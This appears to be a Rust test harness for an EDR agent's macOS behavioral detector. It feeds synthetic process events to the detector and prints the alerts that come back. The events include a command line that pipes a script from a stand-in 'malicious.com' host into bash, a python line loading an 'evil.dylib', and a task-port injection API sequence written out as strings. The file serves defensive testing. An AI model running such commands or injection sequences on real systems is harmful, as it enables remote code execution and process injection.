use std::collections::HashMap;
use tokio::sync::mpsc;
use edr_agent::detectors::behavioral::BehavioralDetector;
use edr_agent::detectors::Detector;
use edr_agent::config::BehavioralDetectorConfig;
use edr_agent::events::{Event, EventData, ProcessEventData, EventType};
use chrono::Utc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 Testing macOS Detection Capabilities");
    
    // Create detector configuration with all required fields
    let config = BehavioralDetectorConfig {
        enabled: true,
        scan_interval_ms: 1000,
        alert_threshold: 0.4,
        prevention_threshold: 0.8,
        track_api_calls: true,
        monitor_memory_operations: true,
        monitor_thread_operations: true,
        cross_platform_detection: true,
        system_process_contexts: HashMap::new(),
        alert_frequency_limits: HashMap::new(),
        path_context_rules: HashMap::new(),
        network_behavior_rules: HashMap::new(),
        time_based_risk_adjustment: Default::default(),
    };
    
    let (alert_sender, mut alert_receiver) = mpsc::channel(100);
    
    // Create behavioral detector
    let detector = BehavioralDetector::new(
        config,
        alert_sender,
        "test-agent".to_string(),
        "test-host".to_string(),
    ).await?;
    
    detector.start().await?;
    
    println!("✅ Behavioral detector started");
    
    // Test 1: mdworker in expected location (should have reduced risk)
    println!("\n📋 Test 1: mdworker process in expected location");
    let mdworker_expected_event = create_test_process_event(
        1,
        "mdworker_shared".to_string(),
        "/System/Library/Frameworks/CoreServices.framework/mdworker_shared".to_string(),
        Some(0),
    )?;
    
    detector.process_event(&mdworker_expected_event).await?;
    
    // Test 2: mdworker in unexpected location (should trigger alert)
    println!("📋 Test 2: mdworker process in unexpected location");
    let mdworker_suspicious_event = create_test_process_event(
        2,
        "mdworker_shared".to_string(),
        "/tmp/mdworker_shared".to_string(),
        Some(1),
    )?;
    
    detector.process_event(&mdworker_suspicious_event).await?;
    
    // Test 3: Dylib injection simulation
    println!("📋 Test 3: macOS task port injection sequence");
    let task_port_event = create_process_with_api_calls(
        3,
        "suspicious_injector".to_string(),
        "/tmp/injector".to_string(),
        vec![
            ("task_for_pid", "target_pid"),
            ("vm_allocate", "PROT_READ|PROT_WRITE|PROT_EXEC"),
            ("vm_write", "shellcode_payload"),
            ("thread_create_running", "remote_thread"),
        ],
    )?;
    
    detector.process_event(&task_port_event).await?;
    
    // Test 4: sharingd in unexpected location (should trigger alert)
    println!("📋 Test 4: sharingd process in unexpected location");
    let sharingd_suspicious_event = create_test_process_event(
        4,
        "sharingd".to_string(),
        "/tmp/sharingd".to_string(),
        Some(1),
    )?;
    
    detector.process_event(&sharingd_suspicious_event).await?;
    
    // Test 5: ReportCrash in wrong location (high severity)
    println!("📋 Test 5: ReportCrash process in suspicious location");
    let reportcrash_suspicious_event = create_test_process_event(
        5,
        "ReportCrash".to_string(),
        "/tmp/ReportCrash".to_string(),
        Some(1),
    )?;
    
    detector.process_event(&reportcrash_suspicious_event).await?;
    
    // Test 6: Shell execution from suspicious location
    println!("📋 Test 6: Shell process in suspicious macOS location");
    let shell_suspicious_event = create_test_process_event(
        6,
        "zsh".to_string(),
        "/tmp/zsh".to_string(),
        Some(1000),
    )?;
    
    detector.process_event(&shell_suspicious_event).await?;
    
    // Test 7: Browser-spawned shell (common in web exploits)
    println!("📋 Test 7: Shell spawned from Safari");
    let browser_shell_event = create_test_process_event_with_cmdline(
        7,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(2000), // Safari PID
        Some("bash -c 'curl http://malicious.com/payload.sh | bash'".to_string()),
    )?;
    
    detector.process_event(&browser_shell_event).await?;
    
    // Test 8: macOS dylib injection attack
    println!("📋 Test 8: macOS dylib (.dylib) injection attack");
    let dylib_injection_event = create_process_with_api_calls(
        8,
        "dylib_injector".to_string(),
        "/tmp/fake_updater".to_string(),
        vec![
            ("dlopen", "/tmp/malicious.dylib"),
            ("dlsym", "hook_function"),
            ("mach_port_allocate", "task_port"),
        ],
    )?;
    
    detector.process_event(&dylib_injection_event).await?;
    
    // Test 9: Process execution from Downloads directory
    println!("📋 Test 9: Process execution from Downloads directory");
    let downloads_event = create_test_process_event(
        9,
        "suspicious_app".to_string(),
        "/Users/user/Downloads/suspicious_app".to_string(),
        Some(3000),
    )?;
    
    detector.process_event(&downloads_event).await?;
    
    // Test 10: Command line with macOS-specific suspicious patterns
    println!("📋 Test 10: Command with macOS injection patterns");
    let macos_injection_cmd_event = create_test_process_event_with_cmdline(
        10,
        "python3".to_string(),
        "/usr/bin/python3".to_string(),
        Some(1000),
        Some("python3 -c 'import ctypes; ctypes.CDLL(\"/tmp/evil.dylib\")'".to_string()),
    )?;
    
    detector.process_event(&macos_injection_cmd_event).await?;
    
    // Test 11: Normal process in expected location (should not alert)
    println!("📋 Test 11: Normal process in expected location");
    let normal_event = create_test_process_event(
        11,
        "ls".to_string(),
        "/bin/ls".to_string(),
        Some(1000),
    )?;
    
    detector.process_event(&normal_event).await?;
    
    // Give some time for processing
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    
    // Check for alerts
    println!("\n🚨 Checking for generated alerts...");
    let mut alert_count = 0;
    
    // Use a timeout to avoid blocking indefinitely
    while let Ok(Some(alert)) = tokio::time::timeout(
        std::time::Duration::from_millis(500),
        alert_receiver.recv()
    ).await {
        alert_count += 1;
        println!("Alert #{}: {}", alert_count, alert.title);
        println!("  Description: {}", alert.description);
        println!("  Severity: {:?}", alert.severity);
        
        if let Some(risk_score) = alert.metadata.get("risk_score") {
            println!("  Risk Score: {}", risk_score);
        }
        
        if let Some(processes) = alert.metadata.get("affected_processes") {
            println!("  Affected Processes: {}", processes);
        }
        
        if !alert.recommended_actions.is_empty() {
            println!("  Recommended Actions:");
            for action in &alert.recommended_actions {
                println!("    - {}", action);
            }
        }
        println!();
    }
    
    if alert_count == 0 {
        println!("ℹ️  No alerts generated - this might indicate the detector is working correctly");
        println!("   for legitimate processes, or detection thresholds may need adjustment.");
    } else {
        println!("📊 Total alerts generated: {}", alert_count);
    }
    
    println!("\n✅ macOS detection capabilities test completed");
    println!("🔍 Tested capabilities:");
    println!("   • System process context recognition (mdworker, sharingd, ReportCrash)");
    println!("   • Suspicious path detection (/tmp, Downloads, dylib injection)");
    println!("   • Shell execution monitoring with browser-spawned detection");
    println!("   • macOS task port manipulation (task_for_pid patterns)");
    println!("   • macOS dylib injection monitoring (dlopen/dlsym)");
    println!("   • Command line pattern analysis for macOS-specific threats");
    println!("   • Memory operation tracking indicators");
    println!("   • Risk scoring and alert generation");
    
    Ok(())
}

fn create_test_process_event(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
    };
    
    Ok(event)
}

fn create_test_process_event_with_cmdline(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
    command_line: Option<String>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
    };
    
    Ok(event)
}

fn create_process_with_api_calls(
    pid: u32,
    name: String,
    path: String,
    api_calls: Vec<(&str, &str)>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let mut metadata = HashMap::new();
    
    // Add API call information to metadata
    for (i, (api, params)) in api_calls.iter().enumerate() {
        metadata.insert(format!("api_call_{}", i), format!("{}({})", api, params));
    }
    
    // Add injection indicators
    if api_calls.iter().any(|(api, _)| *api == "task_for_pid") {
        metadata.insert("injection_indicator".to_string(), "task_port_usage".to_string());
    }
    
    if api_calls.iter().any(|(api, _)| *api == "vm_allocate") {
        metadata.insert("memory_indicator".to_string(), "executable_memory".to_string());
    }
    
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "injection_test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid: Some(1),
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata,
    };
    
    Ok(event)
}
